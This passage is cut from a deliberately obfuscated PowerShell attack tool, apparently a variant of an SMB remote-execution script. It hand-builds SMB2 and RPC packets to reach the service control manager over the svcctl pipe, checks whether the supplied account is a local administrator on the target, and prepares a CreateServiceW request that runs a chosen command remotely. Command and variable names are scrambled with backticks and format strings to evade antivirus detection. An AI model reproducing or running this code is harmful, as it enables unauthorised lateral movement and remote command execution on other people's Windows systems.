                        ${S`mB_C`LiEn`T`_STRe`AM}.("{0}{1}" -f 'Fl','ush').Invoke()
                        ${s`MB_c`lIeNt_st`Re`Am}.("{1}{0}"-f 'ead','R').Invoke(${sm`B_`CLiENt_Re`cei`VE},0,${S`mB_`cL`iEn`T_RE`cei`VE}."lE`Ng`Th") > ${n`UlL}
                        ${SmB_`ClIEnt_`s`T`A`ge} = ("{0}{1}"-f 'Exi','t')
                    }

                }
            
                if(${smbE`Xec_`Fa`I`led})
                {
                    BREAK ("{1}{2}{3}{0}"-f'cute_loop','SM','B','_exe')
                }
            
            }

        }  
        else
        {
            
            ${Smb_cLIE`N`T_`stage} = ("{0}{3}{1}{2}"-f'TreeC','e','ct','onn')

            :SMB_execute_loop while (${s`mB_CLI`En`T_STaGE} -ne ("{0}{1}"-f 'e','xit'))
            {

                switch (${smb_c`l`ieNt_`STaGE})
                {
            
                    ("{2}{3}{1}{0}"-f 'ect','eConn','T','re')
                    {
                        ${Sm`B`2`_mEsSAgE_`Id}++
                        ${pAc`K`ET_SMb2_`HEader} = &("{1}{0}{3}{2}{4}"-f 'acketSMB2','Get-P','ad','He','er') 0x03,0x00 ${SMB2_`Me`ss`AG`E_iD} ${smB`2_`T`Ree_iD} ${SM`B_s`EsSIO`N`_Id}
                        ${PaCket`_`s`MB2_`H`EAdeR}[("{6}{4}{2}{3}{0}{1}{5}" -f 'tR','e','ad','er_Credi','MB2He','quest','S')] = 0x7f,0x00

                        if(${SMB_sI`g`NinG})
                        {
                            ${PAcK`Et_SMB`2_`h`eADeR}[("{2}{0}{1}{3}"-f'er','_Flag','SMB2Head','s')] = 0x08,0x00,0x00,0x00      
                        }

                        ${pAckET`_SM`B2_da`TA} = &("{0}{3}{5}{4}{2}{1}" -f'G','est','TreeConnectRequ','et-PacketS','B2','M') ${sm`B_pa`Th`_B`YteS}
                        ${sm`B2`_HEadEr} = &("{3}{5}{1}{4}{2}{6}{7}{0}"-f'ry','d','e','Co','er','nvertFrom-PacketOr','dDiction','a') ${p`ACk`ET`_sm`B2_he`ADeR}
                        ${sMb2`_da`Ta} = &("{5}{4}{2}{3}{0}{1}" -f'nar','y','edDi','ctio','m-PacketOrder','ConvertFro') ${P`A`C`ket_sMB2_`da`TA}    
                        ${Pac`KEt_NETBio`s_s`Ess`IoN`_seRViCE} = &("{2}{1}{3}{5}{4}{0}"-f 'ice','tNetBI','Get-Packe','OSSessionS','v','er') ${SMB2_h`EaD`er}."lEN`gtH" ${smb2_`D`A`TA}."L`ENGth"
                        ${NETBios`_sESS`IoN_se`Rv`ice} = &("{1}{5}{0}{4}{3}{2}" -f 'd','ConvertFrom-Pa','y','edDictionar','er','cketOr') ${pACKet_`Ne`T`BIOs_`S`eS`siOn`_sE`RVice}

                        if(${sMb_S`IG`NINg})
                        {
                            ${S`M`B2_sign} = ${SMB2_`HE`A`dEr} + ${S`mB2_DA`Ta} 
                            ${smb2`_sig`NATU`RE} = ${HmAc`_Sha2`56}."co`Mp`UteHasH"(${sm`B2_sI`GN})
                            ${s`MB2_SigN`ATu`Re} = ${smB`2_`S`ign`ATurE}[0..15]
                            ${Pa`ck`Et_s`mb`2_`HeaDeR}[("{1}{2}{3}{5}{4}{0}"-f 're','S','MB2','Header','atu','_Sign')] = ${S`M`B`2`_SignAtURE}
                            ${SmB`2_H`eAdeR} = &("{0}{5}{3}{7}{9}{4}{2}{6}{1}{8}" -f'Con','ictio','dered','om-','tOr','vertFr','D','P','nary','acke') ${pAcK`e`T_SMb2_`H`ea`DER}
                        }

                        ${sm`B`_cli`e`NT_`SEND} = ${N`ETB`I`oS_sEss`IoN_SE`Rvi`cE} + ${smB2_`hEa`dER} + ${sMb2`_d`A`TA}
                        ${SmB_CLIEn`T_`ST`R`EAM}.("{1}{0}"-f 'ite','Wr').Invoke(${SMB_ClI`E`N`T_Se`ND},0,${Smb_C`L`i`EnT_seND}."Le`Ng`TH") > ${n`ULl}
                        ${s`M`B_CLIEn`T_StREAm}.("{1}{0}" -f'sh','Flu').Invoke()
                        ${SMB_cLiENT`_S`Tre`AM}.("{1}{0}" -f'd','Rea').Invoke(${sMb`_`C`liE`NT_rE`CE`IVe},0,${sM`B_cLiE`N`T`_rE`CEiVe}."L`engTh") > ${nu`Ll}
                        ${s`m`B_clieNT`_`s`TAGe} = ("{1}{2}{0}{3}" -f'q','Cr','eateRe','uest')
                    }
                  
                    ("{2}{0}{1}{3}"-f 'reateReq','ue','C','st')
                    {
                        ${s`M`B2_TReE_id} = 0x01,0x00,0x00,0x00
                        ${sMb_`NA`MeD`_PIpe_`BYTES} = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 
                        ${Sm`B2_ME`S`s`AGE_iD}++
                        ${paC`K`et_SMb2`_`HeAdeR} = &("{1}{2}{0}{4}{3}"-f 'M','G','et-PacketS','eader','B2H') 0x05,0x00 ${sMb`2_M`essagE`_Id} ${S`mb`2_tReE_ID} ${SMb_s`esS`IO`N_ID}
                        ${pA`ckEt_`smb`2_Hea`D`Er}[("{2}{5}{1}{0}{4}{3}"-f'r_CreditRe','eade','SM','st','que','B2H')] = 0x7f,0x00
                    
                        if(${s`m`B_s`iGNinG})
                        {
                            ${pACkE`T`_`Smb`2_h`eADER}[("{3}{2}{1}{0}{4}"-f '_F','eader','H','SMB2','lags')] = 0x08,0x00,0x00,0x00      
                        }

                        ${paC`kEt_Smb`2_DA`Ta} = &("{3}{0}{4}{2}{1}{5}"-f'e','eRequest','t','Get-PacketSMB2Cr','a','File') ${sMB`_N`A`meD_pi`PE_`ByTes}
                        ${pA`Cket_S`Mb2_da`TA}[("{2}{0}{6}{5}{7}{3}{4}{1}" -f'B2','hare_Access','SM','estFi','le_S','t','Crea','eRequ')] = 0x07,0x00,0x00,0x00  
                        ${sMB`2_H`Ead`Er} = &("{7}{5}{3}{1}{2}{6}{4}{8}{0}" -f'y','e','d','etOrder','ictio','From-Pack','D','Convert','nar') ${PAC`k`Et_Smb2`_Header}
                        ${SMb2_d`A`TA} = &("{4}{3}{5}{6}{1}{2}{0}"-f 'y','dDictiona','r','Packe','ConvertFrom-','tOrd','ere') ${p`ACk`e`T`_sMb2_`daTa}  
                        ${PA`ck`et_neTB`iO`S_SESSiO`N_SErViCE} = &("{6}{3}{1}{0}{2}{5}{4}"-f 'etNetBIOSS','k','e','-Pac','ionService','ss','Get') ${smb2_`He`Ad`ER}."l`ENGth" ${sMB2`_`DaTA}."L`E`Ngth"
                        ${NETbios_`S`Ess`I`on_SErvicE} = &("{7}{4}{1}{5}{3}{0}{6}{2}"-f'edDi','Pac','tionary','rder','om-','ketO','c','ConvertFr') ${pAck`ET`_`NeT`BiOs_S`ES`Si`ON_s`ERVIce}

                        if(${smb`_SI`gNi`Ng})
                        {
                            ${smB2_`sI`GN} = ${s`Mb2`_`hEaDeR} + ${Smb`2_`daTA}  
                            ${SMb`2`_S`Ign`ATure} = ${H`mac_Sh`A256}."C`O`mpuTE`hasH"(${sMb2`_s`iGn})
                            ${S`mb2_sI`G`N`ATURE} = ${smb`2`_SIG`N`AtuRE}[0..15]
                            ${pacKE`T_s`mb`2_heADEr}[("{5}{1}{2}{0}{3}{4}"-f'd','MB2H','ea','er_Signatur','e','S')] = ${S`Mb2_sig`NAt`Ure}
                            ${sM`B`2_`HeaDeR} = &("{4}{1}{5}{0}{3}{2}{6}" -f 'cketOrder','nvertFrom-','i','edDict','Co','Pa','onary') ${PaCKeT_`SMB2_h`EAD`er}
                        }

                        ${s`mb_Cli`E`Nt_seNd} = ${n`eTBI`o`s_SEs`sion_seRvIcE} + ${sMB2_`heA`DER} + ${SmB2`_da`Ta}
                        ${Sm`B_`cLiENt_sTR`EAM}.("{0}{1}" -f'Writ','e').Invoke(${Smb_cLI`e`N`T`_Send},0,${sMB`_C`Li`eNT_S`End}."lEn`g`Th") > ${n`UlL}
                        ${s`Mb_cL`Ie`Nt_St`REam}.("{0}{1}" -f'F','lush').Invoke()
                        ${SM`B`_Cl`IeNT_S`T`REaM}.("{0}{1}" -f'Rea','d').Invoke(${s`Mb_clIenT_R`e`CE`IvE},0,${Smb_CLieN`T_Re`CeI`VE}."le`NGTH") > ${N`UlL}
                        ${Sm`B_`cLIent_S`TaGE} = ("{0}{1}{2}"-f'RPCB','in','d')
                    }
                
                    ("{1}{0}{2}" -f'in','RPCB','d')
                    {
                        ${smb`_NAmED`_`PIpE_byTeS} = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 
                        ${sMb_`FIl`e_Id} = ${sm`B_cl`iEnt`_rE`ceIve}[132..147]
                        ${Sm`B`2_mEsS`A`GE_id}++
                        ${PAckEt_sm`B`2_h`EAd`ER} = &("{0}{5}{4}{1}{3}{2}"-f 'Get-P','SMB','r','2Heade','cket','a') 0x09,0x00 ${SMB2_`M`ESsag`e_`iD} ${sMB2`_`Tr`eE`_ID} ${s`M`B_sES`sIoN`_iD}
                        ${p`A`cKET`_`SmB2_h`eADER}[("{6}{0}{1}{4}{2}{5}{3}" -f 'H','ea','redit','est','der_C','Requ','SMB2')] = 0x7f,0x00
                    
                        if(${smB_`s`IgNINg})
                        {
                            ${P`ACK`ET_SMb`2_HE`AdEr}[("{3}{4}{1}{0}{5}{2}"-f'er_','d','gs','SM','B2Hea','Fla')] = 0x08,0x00,0x00,0x00      
                        }

                        ${PaC`k`e`T_RpC_DaTa} = &("{1}{2}{0}{4}{3}"-f'-Pack','G','et','tRPCBind','e') 1 0xb8,0x10 0x01 0x00,0x00 ${sMB_NAmeD_pi`Pe_`U`UId} 0x02,0x00
                        ${rpc`_`d`AtA} = &("{5}{3}{4}{7}{0}{2}{1}{6}"-f 'etOrder','ctio','edDi','-','P','ConvertFrom','nary','ack') ${p`AC`ket_`Rp`C_datA}
                        ${pAC`ket_S`MB2`_`DAtA} = &("{0}{1}{3}{2}{4}"-f'Get-Pac','ketSMB2Wri','ues','teReq','t') ${SmB`_fiL`E`_Id} ${R`pc_da`TA}."l`eng`Th"
                        ${s`mb2_hE`AdER} = &("{6}{2}{3}{4}{5}{1}{0}"-f 'tionary','deredDic','nvertFrom-P','ack','e','tOr','Co') ${Pac`Ket`_sMB2_h`eaD`ER}
                        ${S`Mb2_d`Ata} = &("{7}{6}{0}{10}{8}{3}{5}{4}{9}{1}{2}"-f 'tFrom-','dDicti','onary','d','r','e','nver','Co','r','e','PacketO') ${Pa`CKeT_sMb2`_`dAtA} 
                        ${R`pc_`D`ATA_`Length} = ${SM`B2_Da`TA}."Le`Ng`Th" + ${R`Pc`_Data}."L`eNgtH"
                        ${p`ACK`et_n`e`TbIO`s`_S`Ess`ION_S`eRViCe} = &("{5}{1}{2}{7}{4}{0}{3}{6}" -f'ssi','ket','Net','onSe','IOSSe','Get-Pac','rvice','B') ${S`MB2_h`Ea`dEr}."lEn`Gth" ${rP`C_Dat`A_LE`N`GTh}
                        ${ne`T`BiOS_s`e`s`S`IOn_se`RVicE} = &("{9}{8}{6}{3}{0}{2}{1}{5}{4}{7}"-f 'tFrom-P','etOrd','ack','r','tio','eredDic','e','nary','nv','Co') ${PACk`eT`_n`eTBiOs_sEssION_`Ser`V`icE}

                        if(${S`m`B_SigNInG})
                        {
                            ${sm`B2`_`sIgn} = ${SM`B`2_heaD`Er} + ${sm`B2`_DAta} + ${rpc`_daTA}
                            ${SM`B2_s`ig`NATURE} = ${hM`Ac_`Sha256}."C`om`pUteh`ASh"(${smb2_`s`Ign})
                            ${smb2_sI`G`N`AtU`Re} = ${Smb2_sIGNA`T`U`RE}[0..15]
                            ${P`ACkEt`_Sm`B2_HEA`Der}[("{2}{1}{4}{0}{3}" -f'_Si','B','SM','gnature','2Header')] = ${s`m`B2_sIG`NA`TURe}
                            ${S`mb2`_H`eAdeR} = &("{4}{1}{2}{3}{5}{0}{6}" -f 'n','v','ertFrom-','PacketO','Con','rderedDictio','ary') ${PA`c`keT`_`SmB2_Hea`DER}
                        }

                        ${SM`B`_CLIeNT`_SeND} = ${nE`TBIoS`_sEs`SIO`N_SErv`Ice} + ${sM`B2_hea`D`ER} + ${SM`B2_DA`Ta} + ${r`pc_`DaTa}
                        ${sMb`_C`Lie`NT`_stREAm}.("{0}{1}" -f'Writ','e').Invoke(${smB_cL`IEn`T`_send},0,${s`MB_cL`i`eNT_`sEnd}."LE`NGTH") > ${N`Ull}
                        ${S`mB_CL`ie`NT_stR`e`Am}.("{1}{0}"-f'ush','Fl').Invoke()
                        ${smB`_client_`stR`EaM}.("{0}{1}"-f 'R','ead').Invoke(${S`mb_cLIeN`T_REcei`VE},0,${SM`B_C`lIE`N`T_r`eCeIVe}."LE`N`gTh") > ${n`Ull}
                        ${S`m`B_`CLIE`NT_StaGE} = ("{2}{1}{0}{3}"-f 'ques','e','ReadR','t')
                        ${smB_C`lIeNt_`stA`Ge`_NE`XT} = ("{1}{2}{0}" -f'W','OpenS','CManager')
                    }
               
                    ("{0}{1}{3}{2}" -f'Re','adReq','est','u')
                    {

                        &("{0}{1}{3}{2}" -f'St','ar','ep','t-Sle') -m ${Sl`e`ep}
                        ${SmB2`_m`esS`AG`E_Id}++
                        ${paC`ket_`SMb2`_He`ADer} = &("{3}{1}{2}{0}"-f'ader','et-','PacketSMB2He','G') 0x08,0x00 ${smB2_MEs`s`A`ge_`Id} ${smB2`_t`Ree`_`ID} ${SM`B`_sES`SiON_iD}
                        ${paC`kE`T_`s`mb2_hEA`dER}[("{2}{3}{4}{1}{0}" -f 'Request','edit','S','MB2He','ader_Cr')] = 0x7f,0x00
                        ${packet_sM`B`2_he`AdeR}[("{0}{3}{2}{4}{1}{5}"-f 'S','ed','Hea','MB2','der_Cr','itCharge')] = 0x10,0x00
                    
                        if(${sMB`_`SigN`Ing})
                        {
                            ${PaCK`eT_S`M`B2_HEadER}[("{3}{4}{2}{0}{1}" -f'Header_F','lags','2','SM','B')] = 0x08,0x00,0x00,0x00      
                        }

                        ${p`Ac`KeT_`sMB2_DaTA} = &("{3}{1}{2}{0}{4}"-f 'MB2ReadReque','et-P','acketS','G','st') ${sMb_F`il`e_ID}
                        ${s`mb`2_HeAder} = &("{1}{4}{0}{5}{2}{3}{6}" -f 'r','Conver','dDictio','nar','tF','om-PacketOrdere','y') ${paC`KeT_`Smb2_H`eAD`Er}
                        ${Sm`B2_`DA`TA} = &("{5}{0}{6}{3}{4}{7}{2}{1}" -f 'v','ry','ona','tFrom-P','acketOrde','Con','er','redDicti') ${pACkEt_smB2`_`d`Ata} 
                        ${P`AcKe`T_`NetBios_sE`sSion_S`eR`V`I`Ce} = &("{7}{6}{4}{0}{2}{3}{8}{5}{1}"-f'e','ice','t','Ne','ack','erv','P','Get-','tBIOSSessionS') ${smb2_`H`EadEr}."lE`NGTH" ${sMB2_D`A`Ta}."Le`N`GTh"
                        ${n`Etbi`oS`_Sessi`ON_`SErvice} = &("{2}{6}{5}{7}{0}{4}{9}{1}{3}{8}"-f'Pac','ct','Conv','io','ketOrde','From','ert','-','nary','redDi') ${PackeT`_n`EtB`ios_`SeS`sION_seRvi`Ce}

                        if(${smB`_s`I`GNInG})
                        {
                            ${S`mB2`_sIgn} = ${s`M`B2_`HEAdER} + ${s`mB2_`DaTA} 
                            ${smB2_Si`gNA`Tu`Re} = ${HmAC`_SHA`256}."cOM`p`Ut`eHASh"(${sMB`2_s`I`GN})
                            ${S`Mb2_s`iGnA`TUrE} = ${SMB`2_`siGn`A`TUrE}[0..15]
                            ${pacKET_s`mb2_H`eA`DEr}[("{1}{2}{3}{4}{5}{0}"-f 'ature','SMB2Heade','r','_','Si','gn')] = ${s`MB2_s`IGN`AT`URe}
                            ${SmB2`_h`ea`dER} = &("{6}{0}{4}{2}{1}{3}{5}"-f'on','edDiction','acketOrder','a','vertFrom-P','ry','C') ${pAcKeT_S`mb`2`_heADer}
                        }

                        ${s`M`B`_CLieNT_SenD} = ${N`e`TbIOS_`sE`SSi`On_`serVi`ce} + ${smb2_H`eA`deR} + ${sM`B`2_`Data} 
                        ${Smb_`cLI`eN`T_sT`Ream}.("{1}{0}" -f'ite','Wr').Invoke(${sM`B_`CLIEnT_`S`END},0,${sm`B_ClIenT`_s`EnD}."Le`NG`Th") > ${N`ULL}
                        ${SMB`_c`lie`NT`_stR`EAM}.("{1}{0}"-f'ush','Fl').Invoke()
                        ${Smb_c`l`IEnT_`stR`eAm}.("{0}{1}" -f 'Re','ad').Invoke(${s`mb`_`CliEnt_RE`C`eI`VE},0,${sMb_`cL`IEnt_RE`CEIVe}."l`engTh") > ${NU`ll}

                        if( ( &("{0}{2}{3}{1}"-f 'g','e','ET-VAri','ABL')  814  -vaLUeoNL  )::"toS`TRi`Ng"(${SmB_Cl`iE`Nt`_Re`ceive}[12..15]) -ne ("{2}{1}{3}{0}" -f '0','-','03','01-00-0'))
                        {
                            ${SmB_cLient`_`st`AgE} = ${SmB`_CLiE`NT_St`A`GE_ne`XT}
                        }
                        else
                        {
                            ${smb_CL`ienT_s`T`A`GE} = ("{1}{3}{0}{2}"-f'di','Sta','ng','tusPen')
                        }

                    }

                    ("{2}{1}{3}{0}" -f'g','d','StatusPen','in')
                    {
                        ${S`Mb`_CLient`_strEam}.("{1}{0}" -f'd','Rea').Invoke(${sm`B_c`LiE`NT`_ReC`EIvE},0,${Smb_CliEn`T_`R`ECeIVE}."LE`NgtH") > ${nU`lL}

                        if(  (&("{0}{1}" -f'IT','eM') ("{0}{2}{1}{3}" -f'v','iABLe:','ar','814')  ).valUE::"TOstrI`NG"(${SMb`_`cl`i`e`Nt_ReCeI`VE}[12..15]) -ne ("{3}{2}{0}{1}"-f'1','-00-00','0','03-'))
                        {
                            ${s`Mb`_cL`I`eNt_STagE} = ${s`m`B_cLIENT_stA`GE`_nExT}
                        }

                    }
                
                    ("{1}{2}{0}" -f 'W','OpenSCManage','r')
                    {
                        ${SmB2_Me`Ss`Age_`ID} = 30
                        ${pacKet`_SMb`2_`HEa`dEr} = &("{0}{1}{3}{2}"-f 'Get-PacketS','MB2','ader','He') 0x09,0x00 ${SMB`2`_Me`ssage_`ID} ${sMB`2_t`RE`e_Id} ${sm`B_SESsI`On_ID}
                        ${packeT`_s`m`B2`_H`ea`der}[("{3}{2}{1}{0}{4}" -f'Req','ader_Credit','2He','SMB','uest')] = 0x7f,0x00
                    
                        if(${smB_SI`G`NI`NG})
                        {
                            ${P`Ack`Et_S`m`B2_hEa`dEr}[("{3}{1}{0}{2}{4}"-f 'Fla','ader_','g','SMB2He','s')] = 0x08,0x00,0x00,0x00      
                        }

                        ${PACk`e`T_`S`cM_Data} = &("{2}{3}{5}{1}{6}{0}{4}"-f 'ag','SC','Get-PacketS','CM','erW','Open','Man') ${Sm`B`_S`e`RVICE_B`YteS} ${Sm`B`_`seRvice_`LEn`GtH}
                        ${SCM`_dATa} = &("{2}{7}{1}{6}{5}{0}{3}{4}" -f 't','-','ConvertFr','i','onary','eredDic','PacketOrd','om') ${paC`ket_`sCM`_DATa}
                        ${pa`C`kE`T_rpc_`DATA} = &("{1}{2}{0}{3}{5}{4}"-f '-Packet','G','et','RP','est','CRequ') 0x03 ${sc`m_dAta}."L`enGtH" 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
                        ${RPc_`datA} = &("{9}{3}{2}{7}{10}{1}{8}{6}{0}{5}{4}"-f'rder','ck','Fr','ert','ictionary','edD','tO','om','e','Conv','-Pa') ${PacK`eT_RPc_d`ATA} 
                        ${Pa`ckET_S`m`B2_D`AtA} = &("{2}{4}{0}{3}{6}{5}{1}"-f'MB','est','Get-Pa','2Wri','cketS','eRequ','t') ${Sm`B`_fil`E_iD} (${RPc_`DA`Ta}."lE`NgTH" + ${s`cM`_dAtA}."Le`N`gTH")
                        ${sMb2`_H`eAdER} = &("{0}{2}{6}{3}{5}{1}{7}{4}"-f 'Conv','iction','ertFrom-P','Or','y','deredD','acket','ar') ${pa`c`kE`T_sMb2`_hEa`DeR}
                        ${sMb`2`_da`Ta} = &("{5}{6}{7}{2}{8}{4}{3}{0}{1}"-f'tiona','ry','m-','deredDic','r','Conver','tFr','o','PacketO') ${pAc`kEt_`S`mB`2_dA`TA} 
                        ${rp`C_data_L`enGTh} = ${sm`B2_da`Ta}."LeNG`Th" + ${Sc`M_dATa}."Le`N`Gth" + ${rP`C`_DatA}."leNG`Th"
                        ${P`AckE`T_NeTbIos_SESSIon_`Se`RV`ICE} = &("{0}{3}{2}{4}{7}{6}{5}{1}"-f 'G','Service','Packet','et-','NetBIOSSe','n','sio','s') ${sMB`2_`h`eADER}."L`e`NGth" ${RPc`_DaTA_leN`gTh}
                        ${NE`T`Bi`OS_`SE`SSI`oN_SERViCE} = &("{1}{5}{2}{3}{8}{0}{6}{7}{4}{9}"-f 'm-','C','rt','Fr','rderedDi','onve','Packet','O','o','ctionary') ${PackeT`_NE`Tb`IOS_Se`s`SiOn`_s`er`V`Ice}

                        if(${sMb_`SiG`NinG})
                        {
                            ${SmB`2_`siGn} = ${SMB2_`Hea`DEr} + ${sM`B2_`dATA} + ${rp`C_d`AtA} + ${sCM_`D`A`TA}
                            ${s`M`B2_`SigNa`TURe} = ${h`MAC_`Sha256}."c`OMp`UtEHasH"(${smb2_s`i`gN})
                            ${sM`B`2_SIgnA`TUrE} = ${S`mb2_s`i`GnATu`RE}[0..15]
                            ${PACKeT_`s`mB2_`h`eaDEr}[("{2}{3}{0}{5}{4}{1}" -f 'ea','gnature','S','MB2H','r_Si','de')] = ${sMB2`_sIG`NA`TURe}
                            ${sM`B`2_Hea`Der} = &("{6}{4}{2}{3}{7}{5}{1}{0}" -f 'ry','na','-Packe','tOr','vertFrom','o','Con','deredDicti') ${PACKEt_SMb2_H`Ea`D`er}
                        }

                        ${SMb_CLIEn`T`_SE`ND} = ${NEtbI`oS_s`Es`sIon`_S`ERV`ICe} + ${s`M`B`2_HEAder} + ${SMB2_d`A`Ta} + ${rpC`_Da`Ta} + ${ScM`_Da`Ta}
                        ${SMb_Cl`I`e`Nt_`StREAm}.("{0}{1}"-f'W','rite').Invoke(${SMb`_CliEnt_`S`E`ND},0,${S`mb_CL`iEn`T_sEnD}."lEnG`TH") > ${N`Ull}
                        ${smB_c`LIEnt_`s`TR`E`AM}.("{1}{0}"-f'h','Flus').Invoke()
                        ${sM`B_`clie`NT`_str`EaM}.("{1}{0}"-f'ad','Re').Invoke(${SMb_cl`iE`NT_re`ceivE},0,${SMB_cLi`En`T_RECE`IVe}."len`GTH") > ${N`ULl}
                        ${S`mB_cL`I`e`Nt_sTAGe} = ("{3}{2}{1}{0}" -f'equest','R','ad','Re')
                        ${SMB`_`c`lIe`NT_st`Age_NeXT} = ("{0}{1}{2}{3}"-f'C','heck','Acces','s')        
                    }

                    ("{3}{0}{2}{1}"-f 'eckAcce','s','s','Ch')
                    {

                        if(  (  &("{1}{0}{2}{3}"-f 'hil','c','Di','TeM')  ("{2}{0}{3}{1}"-f'a',':814','V','RiAbLe')).vaLue::"tO`Str`ing"(${S`Mb`_cl`iEnT_`RECeIvE}[128..131]) -eq ("{2}{0}{1}"-f'-0','0-00-00','00') -and   (  &("{1}{2}{3}{0}"-f 'TEM','G','Et-','cHildi') ("{1}{3}{0}{2}"-f'ia','va','bLe:814','R') ).ValUE::"to`sTr`INg"(${S`Mb_CLiEnT_re`ceI`Ve}[108..127]) -ne ("{10}{7}{4}{11}{8}{12}{9}{13}{2}{15}{1}{14}{16}{6}{3}{0}{5}" -f '00-','0','-','-','00','00','-00','-','-00-00-','0','00-00-00-00-00','-00-00','0','-00','0','00-','-00-00-00'))
                        {

                            ${Smb`_sE`RVIce`_Ma`NagEr_c`ONTeXt_ha`ND`le} = ${sM`B_`cLi`ent_`REC`eIVe}[108..127]
                            
                            if(${sM`B_ex`ECUtE} -eq ${t`Rue})
                            {
                                &("{1}{2}{3}{0}"-f'erbose','Wr','ite-','V') ("$output_username "+'i'+'s '+'a '+'l'+'ocal'+' '+'a'+'dmini'+'st'+'rat'+'or '+'on'+' '+"$Target")
                                ${pA`cKE`T`_`S`Cm_dATa} = &("{3}{2}{1}{0}{6}{4}{5}" -f 'teSer','a','cketSCMCre','Get-Pa','c','eW','vi') ${sMB_S`Er`VICE_MAnAger_CoNtex`T`_H`A`NdlE} ${smB`_SER`VI`CE`_Bytes} ${s`mb`_SERv`IcE_l`Eng`Th} ${sMbE`XE`c`_`c`om`ManD_BYTeS} ${SMBE`Xec_cO`m`maND`_LE`Ng`TH_B`YTES}
                                ${scm_`D`A`TA} = &("{3}{4}{6}{7}{2}{8}{1}{5}{0}" -f 'onary','r','tOrd','Conv','ert','edDicti','From','-Packe','e') ${Pack`eT_s`CM`_d`ATa}

                                if(${S`cm_D`AtA}."Le`N`gtH" -lt ${S`mb_`sPL`It`_indEx})
                                {
                                    ${s`mB_cLieNt_`s`TAGE} = ("{2}{0}{1}{3}" -f 'r','e','C','ateServiceW')
                                }
                                else
                                {
                                    ${s`m`B_`C`LIEnt_StaGE} = ("{0}{1}{3}{4}{2}{5}"-f'CreateS','e','eW','rvi','c','_First')
                                }

                            }
                            else
                            {
                                &("{1}{2}{0}" -f 'tput','Write-','Ou') ("$output_username "+'is'+' '+'a '+'l'+'o'+'cal '+'adm'+'in'+'i'+'s'+'trator '+'on'+' '+"$Target")
                                ${S`M`B2`_MessaGE_`id} += 20
                                ${S`Mb`_`c`loSe_SerV`Ice_`hAnDl`e_stAGE} = 2
                                ${Smb_`cl`i`eN`T_StAge} = ("{5}{2}{1}{0}{4}{3}" -f 'v','er','loseS','eHandle','ic','C')
                            }

                        }
                        elseif( (  &("{0}{2}{1}"-f 'v','able','aRi')  814 -vA  )::"t`Os`TRINg"(${SmB`_CLi`ENt`_rEC`EIVE}[128..131]) -eq ("{0}{2}{1}"-f'0','0-00','5-00-0'))
                        {
                            &("{1}{2}{0}"-f'tput','Write','-Ou') ("$output_username "+'is'+' '+'not'+' '+'a '+'loc'+'al '+'administ'+'rat'+'or'+' '+'or'+' '+'does'+' '+'n'+'ot '+'ha'+'ve '+'requir'+'ed'+' '+'pr'+'ivilege'+' '+'on'+' '+"$Target")
                            ${SmBeXeC`_fa`I`LEd} = ${Tr`UE}
                        }
                        else
                        {
                            &("{3}{0}{2}{1}"-f'tp','t','u','Write-Ou') ('Some'+'t'+'hing '+'w'+'ent '+'w'+'rong '+'wi'+'th '+"$Target")
                            ${Sm`BeX`eC_fa`I`Led} = ${t`RuE}
                        }

                    }
                
                    ("{0}{3}{2}{1}"-f'C','eServiceW','eat','r')
                    {
                        
                        if(${sm`B`e`Xec`_C`omManD_BYtes}."Le`Ngth" -lt ${SMb`_s`PliT`_In`DeX})
                        {
                            ${sM`B`2_MEsSAGE`_ID} += 20
                            ${pac`K`eT`_S`MB2_hE`AdER} = &("{1}{3}{0}{2}" -f 'B2H','Get-Pack','eader','etSM') 0x09,0x00 ${smb`2_`MEsSa`GE_ID} ${sm`B2_T`Ree_iD} ${Smb`_S`Essi`O`N_id}
                            ${pACK`e`T_sMB2_`HeA`d`ER}[("{0}{4}{1}{3}{2}{5}" -f 'S','der_Cre','equ','ditR','MB2Hea','est')] = 0x7f,0x00
                        
                            if(${SM`B_s`iGniNG})
                            {
                                ${Pack`et_s`mB2`_HEadEr}[("{2}{3}{1}{0}{4}"-f'ader','e','SM','B2H','_Flags')] = 0x08,0x00,0x00,0x00      
                            }

                            ${Pa`CKEt`_RpC_`DatA} = &("{5}{1}{4}{3}{0}{2}"-f 'Reque','ck','st','RPC','et','Get-Pa') 0x03 ${s`cM`_DaTa}."LENG`TH" 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00
                            ${Rpc`_daTa} = &("{0}{8}{6}{7}{1}{4}{5}{9}{2}{3}"-f'C','ac','ct','ionary','ketOr','deredD','tFro','m-P','onver','i') ${PAC`keT_`RPC`_datA}
                            ${p`ACket_`s`Mb2_`datA} = &("{2}{5}{1}{0}{4}{3}" -f 't','acketSMB2Wri','Ge','Request','e','t-P') ${s`Mb_`F`iLe_id} (${RPc_dA`Ta}."le`N`Gth" + ${sc`m_D`Ata}."l`eNg`TH")
                            ${sm`B2_He`AD`Er} = &("{0}{5}{6}{8}{2}{3}{1}{4}{7}"-f 'C','PacketOrderedDicti','ertFrom','-','o','o','n','nary','v') ${pa`cKe`T_S`mb2`_HeAd`eR}
                            ${Smb`2`_DaTa} = &("{3}{4}{0}{6}{1}{5}{2}" -f 'ket','i','nary','Conv','ertFrom-Pac','ctio','OrderedD') ${p`AckET_sMB2_d`A`Ta}
                            ${RpC_`DaT`A_L`ENGTH} = ${S`MB2_`d`Ata}."lENg`Th" + ${s`Cm_da`TA}."LeN`gtH" + ${R`pc`_d`AtA}."le`Ng`Th"
                            ${PA`cket`_nETbIOS`_SE`SsI`ON_`SerViCE} = &("{5}{0}{4}{3}{6}{8}{7}{1}{2}" -f 'PacketNet','onServi','ce','SSe','BIO','Get-','s','i','s') ${s`Mb2_H`eA`dER}."l`eNgTH" ${R`p`c_dAt`A`_LENgth}
                            ${nEtbIO`s_SE`SsiOn_se`RV`ICe} = &("{0}{2}{8}{1}{6}{7}{10}{5}{9}{4}{3}" -f 'Co','t','nvertFrom-','nary','tio','d','Or','der','Packe','Dic','e') ${pA`ck`et_`N`eTbioS_`se`SSi`On_seRVicE}

                            if(${SMb`_s`ign`ing})
                            {
                                ${S`Mb2_s`i`gn} = ${Sm`B`2_hEADEr} + ${smB`2_`Data} + ${rpC_`D`ATA} + ${S`cM`_dA`TA}
                                ${S`Mb`2_si`GNaTU`Re} = ${hMAC_sH`A`2`56}."COMPUT`e`HasH"(${S`mb`2_SiGN})
                                ${s`MB2_`SIG`NaturE} = ${SMb`2_`SIgnatURE}[0..15]
